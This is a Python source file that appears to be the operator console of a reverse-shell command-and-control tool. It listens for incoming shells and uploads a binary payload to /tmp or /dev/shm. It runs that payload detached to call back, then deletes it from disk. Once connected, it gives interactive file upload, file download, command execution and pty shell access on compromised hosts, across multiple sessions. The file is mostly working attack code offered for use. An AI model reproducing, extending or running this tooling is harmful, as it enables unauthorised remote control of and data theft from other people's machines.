#!python3

from modules.nethelper import pretty, PyServerSocket, BashServerSocket, SendPayload
from modules.utils import send_file, chk_payload, local_shell
from modules.sysinfo import SystemInfoGatherer
from modules.shell import RawShell
from rich.console import Console
from modules.commands import ls
from threading import Thread

import logging
import signal
import rich
import json
import time
import sys
import cmd
import os


logging.basicConfig(level=logging.DEBUG)
sys.dont_write_bytecode = True
console = Console()
PROJ_DIR = os.path.dirname(os.path.realpath(__file__))

class Shell():
    def __init__(self, socket):
        self.socket = socket
        self.session_type = "bash"
        self.socket.is_open = True
        self.is_bg = False

class KeyboardBackground(Exception):
    pass

class NetShell(cmd.Cmd):
    def __init__(self, socket):
        super(NetShell, self).__init__()
        self.prompt = "net_shell > "
        self.socket = socket
        self.id = None
        self.output = None
        self.shell_active = True
        Thread(target=self.is_alive).start()

    def default(self, line):
        local_shell(line)

    def emptyline(self):
        """Called when an empty line is entered in response to the prompt.

        If this method is not overridden, it repeats the last nonempty
        command entered.
        """
        return None

    def precmd(self, line):
        """Hook method executed just before the command line is
        interpreted, but after the input prompt is generated and issued.
        """
        if not self.socket.is_open:
            raise BrokenPipeError
        return line

    def postcmd(self, stop, line):
        """Hook method executed just after a command dispatch is finished."""
        return stop

    # Signal handling
    def signal_handler(self, sig, frame):
        """Handle received signals."""
        if sig == signal.SIGINT:
            sys.stdout.write("\n")
            raise KeyboardInterrupt
        elif sig == signal.SIGTSTP:
            sys.stdout.write("\n")
            raise KeyboardBackground

    def cmdloop_with_sigint(self):
        try:
            signal.signal(signal.SIGINT, self.signal_handler)
            signal.signal(signal.SIGTSTP, self.signal_handler)
            self.cmdloop()
        except KeyboardInterrupt:
            self.cmdloop_with_sigint()
        except KeyboardBackground:
            an = input("Do you want to background this session? ")
            if an.lower() == "y":
                return False
            elif an.lower() == "n":
                self.cmdloop_with_sigint()

    """
        <--CMD library ends here-->
    """

    def is_alive(self):
        while self.socket.is_open:
            try:
                data = self.socket.send_command("aliv")
                if len(data) == 0:
                    raise ConnectionError
            except (BlockingIOError, AttributeError):
                pass
            except (ConnectionError, OSError, ValueError):
                logging.error(f"Session {self.id +1}: Connection lost")
                self.socket.is_open = False
                self.socket.client_socket.close()
                self.socket.server_socket.close()
                break
            except Exception as e:
                logging.error(f"Unexpected exception when checking if a socket is closed: {e}")
                break
            time.sleep(10)

    """
        <--Commands start here-->
    """

    def do_ls(self, line):
        try:
            is_err, _data = self.socket.send_command(f"ls {line}")
            data = pretty(_data)
            if is_err:
                sys.stdout.write(f"{data}\n")
            else:
                console.print(ls(json.loads(data)))
        except BrokenPipeError:
            self.do_exit("")

    def do_put(self, line):
        filename = line.split("/")[-1]
        check = self.socket.send_command(f"put_file {filename}")
        time.sleep(2)
        if b"ready" in check:
            with open(line, "r") as f:
                self.socket.send_msg(f.read())

    def do_get(self, line):
        is_err, _data = self.socket.send_command(f"get_file {line}")
        data = pretty(_data)
        if not is_err:
            with open(line.split("/")[-1], "w") as f:
                f.write(f"{data}\n")
        else:
            sys.stdout.write(f"{data}\n")

    def do_run(self, line):
        is_err, _data = self.socket.send_command(f"cmd {line}")
        data = pretty(_data)
        if data:
            sys.stdout.write(f"{data}\n")

    def do_shell(self, line):
        self.socket.send_command(f"shell")
        RawShell(self.socket, pty=True).run()
        return
    
    def do_cd(self, line):
        is_err, _data = self.socket.send_command(f"cd {line}")
        data = pretty(_data)
        if data:
            sys.stdout.write(f"{data}\n")

    def do_exit(self, line):
        logging.info(f"Closing connection from session {self.id +1}")
        self.is_bg = False
        self.socket.is_open = False
        self.socket.client_socket.close()
        self.socket.server_socket.close()
        return True

class LocalShell(cmd.Cmd):
    def __init__(self):
        super(LocalShell, self).__init__()
        # Override cmdloop to handle keyboard interrupts
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTSTP, self.signal_handler)

        self.prompt = "local_shell > "
        self.sessions = []
        self.current_session = None
        if len(sys.argv) > 1 and sys.argv[1] == "-l":
            self.do_listen(None)

    def default(self, line):
        local_shell(line)

    def emptyline(self):
        """Called when an empty line is entered in response to the prompt.

        If this method is not overridden, it repeats the last nonempty
        command entered.
        """
        return None

    def postcmd(self, stop, line):
        """Hook method executed just after a command dispatch is finished.
        """

        return stop

    # Signal handling
    def signal_handler(self, sig, frame):
        """Handle received signals."""
        if sig == signal.SIGINT:
            sys.stdout.write("\n")
            raise KeyboardInterrupt
        elif sig == signal.SIGTSTP:
            print("\nCtrl+Z pressed. Type 'exit' to quit.")
            raise KeyboardInterrupt

    def cmdloop_with_sigint(self):
        try:
            self.cmdloop()
        except (KeyboardInterrupt, BrokenPipeError):
            self.cmdloop_with_sigint()
        
    """
        <--Commands start here-->
    """

    def do_compile(self, line):
        chk_payload(PROJ_DIR)

    def do_listen(self, line):
        host, port = ("0.0.0.0", 4242)
        raw_shell = False

        if line == "--raw":
            raw_shell = True
        else:
            args = line.strip().split(" ")
            if not line:
                pass
            elif len(args) < 2:
                print("Error: Invalid input. Please enter in the format 'host port [optional_arg]'.")
                return
            elif len(args) == 2:
                host, port = args
            else:
                if args[2] != "--raw":
                    logging.error(f"error: unknown param {args[2]}")
                    return
                host, port, raw_shell = args[:3]

            try:
                port = int(port)
            except ValueError:
                print("Error: Invalid input. Port should be a number.")
                return

        sock = BashServerSocket()

        try:
            sock.server_socket.bind((host, int(port)))
        except (OSError):
            logging.error("Address already in use")
            return

        try:
            sock.listen()
            if not sock.is_shell():
                logging.error("No shell found")
                return
        except (KeyboardInterrupt, BrokenPipeError) as e:
            sock.server_socket.close()
            if e == BrokenPipeError:
                logging.error("BrokenPipeError")
            return

        if not sock: return
        sock.sysinfo = SystemInfoGatherer()
        # sock.sysinfo.binaryGatherer(sock)

        if not raw_shell:
            try:
                logging.info(f"Sending payload")

                payload_con = SendPayload(sock)
                sock.send_command("cd /tmp || cd /var/tmp || cd /dev/shm")
                payload_con.listen(host)
                payload_con.send_file(os.path.join(PROJ_DIR, "payloads/payload"))
                logging.info(f"File sent")

                test = pretty(sock.send_command("./payload --test"))

                if not test == "Hello world! Wasd":
                    logging.error("Thing did not run")
                    raise Exception

                logging.debug(f"Payload sent. Starting listener")
                sock.client_socket.send(f"setsid sh -c './payload --host {host} --port {port}'".encode())

                sock.server_socket.close()
                sock.client_socket.close()

                sock = PyServerSocket()

                try:
                    sock.server_socket.bind((host, int(port)))
                except socket.error:
                    logging.error("Address already in use")
                    raise 

                try:
                    sock.listen()
                    if not sock.is_shell():
                        logging.error("No shell found")
                        return
                except KeyboardInterrupt:
                    sock.server_socket.close()
                    return
                except BrokenPipeError:
                    sock.server_socket.close()
                    logging.error("BrokenPipeError")
                    return

                if not sock: return
                sock.send_command("cmd rm -rf payload")
                self.current_session = NetShell(sock)
                self.current_session.session_type = "python"
            except Exception as e:
                logging.error(f"Fail to initialize payload. {e}")
                self.current_session = Shell(sock)
                self.current_session.session_type = "bash"
        else:
            self.current_session = Shell(sock)

        self.sessions.append(self.current_session)
        self.current_session.id = (len(self.sessions) - 1)
        logging.info(f"Session {self.current_session.id + 1} created")
        if self.current_session.session_type == "python":
            self.current_session.cmdloop_with_sigint()
            signal.signal(signal.SIGINT, self.signal_handler)
            signal.signal(signal.SIGTSTP, self.signal_handler)
        elif self.current_session.session_type == "bash":
            RawShell(self.current_session.socket).run()
            Thread(target=self.is_alive, args=[self.current_session]).start()

    def do_sessions(self, line):
        args = line.split(" ")
        if args and "-i" in args[0]:
            try:
                index = int(args[1])
            except ValueError:
                logging.error("Index must be int")
                return
            if index:
                if index > len(self.sessions):
                    logging.error("Sesssion not found")
                    return
            session = self.sessions[index -1]
            if not session.socket.is_open:
                logging.error("Session is closed")
            elif session.session_type == "python":
                session.cmdloop_with_sigint()
                signal.signal(signal.SIGINT, self.signal_handler)
                signal.signal(signal.SIGTSTP, self.signal_handler)
            elif session.session_type == "bash":
                RawShell(session.socket).run()
                
            return

        for shell in self.sessions:
            # TODO: Format this
            if shell.session_type == "python":
                sys.stdout.write(f"Session {shell.id +1} | IP address {shell.socket.server_address} "
                                f"| Port {shell.socket.server_port} | Open: {shell.socket.is_open}\n")
            elif shell.session_type == "bash":
                sys.stdout.write(f"Session {shell.id +1} | IP address {shell.socket.client_address[0]} "
                                f"| Port {shell.socket.server_socket.getsockname()[1]} | Open: {shell.is_open}\n")

        sys.stdout.write("\n")

    def do_exit(self, line):
        logging.info("Exiting...")

        for netShell in self.sessions:
            if netShell.socket.is_open:
                netShell.is_bg = False
                netShell.socket.client_socket.close()
                netShell.socket.server_socket.close()

        sys.exit()


if __name__ == "__main__":
    if not os.path.isfile(os.path.join(PROJ_DIR, "payloads/payload")):
        logging.warning('Warning: Binary file "payload" is not present.')
        chk_payload(PROJ_DIR)
        sys.exit()

    LocalShell().cmdloop_with_sigint()
